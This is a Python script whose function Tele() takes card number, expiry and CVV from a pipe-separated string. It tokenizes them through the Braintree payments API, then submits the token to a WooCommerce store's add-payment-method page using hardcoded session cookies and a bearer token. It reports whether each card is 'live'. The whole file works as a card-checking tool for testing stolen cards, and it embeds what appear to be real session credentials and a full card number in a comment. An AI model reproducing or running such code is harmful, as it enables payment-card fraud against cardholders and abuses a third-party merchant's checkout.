import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	

	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTc5OTEzNzEsImp0aSI6IjIxNjNlYjhhLTJkYWItNDc2Mi1iNTk0LWU0YjA0MTgxYzVlMyIsInN1YiI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.jt0yIXHHOLclKCknGOHEXKRyyOOlT5B9wxrkgyXFtiI8cM9fl_Gnz4rP0-bz8u-t0gocn5f4Q5VvquzSaQBVEg',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '1b2f66a0-c495-44d9-859e-c53a534db6ca',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"1b2f66a0-c495-44d9-859e-c53a534db6ca"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5155491342352633","expirationMonth":"04","expirationYear":"2028","cvv":"726"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)

	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	



	cookies = {
    'br_lgv_stat': 'default%7Cdefault',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-09%2003%3A45%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-06-09%2003%3A45%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    '_gcl_au': '1.1.1039263952.1717904732',
    '_ga': 'GA1.1.1613173725.1717904732',
    '_fbp': 'fb.1.1717904732684.350208071803167906',
    'newpass_announce': 'true',
    'closed_announcement': 'true',
    'cookielawinfo-checkbox-functional': 'yes',
    'cookielawinfo-checkbox-performance': 'yes',
    'cookielawinfo-checkbox-analytics': 'yes',
    'cookielawinfo-checkbox-advertisement': 'yes',
    'cookielawinfo-checkbox-others': 'yes',
    'viewed_cookie_policy': 'yes',
    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'moh55296888vbnm%7C1719114412%7CwZrgJ86Z8yNG5YiE036dGzwKkLgyhbzvfWKcO7ZUPm9%7C5a86d5835d96bc114eb7e78eb6b5559646a66e6e8255912767f092867386718d',
    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'moh55296888vbnm%7C1719114412%7CwZrgJ86Z8yNG5YiE036dGzwKkLgyhbzvfWKcO7ZUPm9%7C32e8ff9a37c26c6f21acb62e80e7e33cdbddaa6c3823cd65fa8cb5c656b0f354',
    'sbjs_session': 'pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
    '_uetsid': 'b872c270261211ef81ddc12adc39cdc0',
    '_uetvid': 'b873acf0261211efa5545d92dac21af2',
    '_ga_JVCGZDD7ML': 'GS1.1.1717904732.1.1.1717904972.55.0.1050105364',
}

	headers = {
    'authority': 'ce4less.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'br_lgv_stat=default%7Cdefault; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-09%2003%3A45%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-09%2003%3A45%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; _gcl_au=1.1.1039263952.1717904732; _ga=GA1.1.1613173725.1717904732; _fbp=fb.1.1717904732684.350208071803167906; newpass_announce=true; closed_announcement=true; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; viewed_cookie_policy=yes; cli_user_preference=en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes; CookieLawInfoConsent=eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9; wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7=moh55296888vbnm%7C1719114412%7CwZrgJ86Z8yNG5YiE036dGzwKkLgyhbzvfWKcO7ZUPm9%7C5a86d5835d96bc114eb7e78eb6b5559646a66e6e8255912767f092867386718d; wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7=moh55296888vbnm%7C1719114412%7CwZrgJ86Z8yNG5YiE036dGzwKkLgyhbzvfWKcO7ZUPm9%7C32e8ff9a37c26c6f21acb62e80e7e33cdbddaa6c3823cd65fa8cb5c656b0f354; sbjs_session=pgs%3D20%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=b872c270261211ef81ddc12adc39cdc0; _uetvid=b873acf0261211efa5545d92dac21af2; _ga_JVCGZDD7ML=GS1.1.1717904732.1.1.1717904972.55.0.1050105364',
    'origin': 'https://ce4less.com',
    'pragma': 'no-cache',
    'referer': 'https://ce4less.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': '763bbb59cc',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text=(response.text)
	import re
	pattern = r"Status code \d+: (.+?)\s*</li>"
	
	match = re.search(pattern, text)
	if match:
	    duplicate_message = match.group(1)
	    return duplicate_message
	else:
		if 'Nice! New payment method added' in text:
			return 'live'
		elif 'risk_threshold' in text:
			return 'risk_threshold'
		else:
			print(text)
			return 'risk_threshold'
	
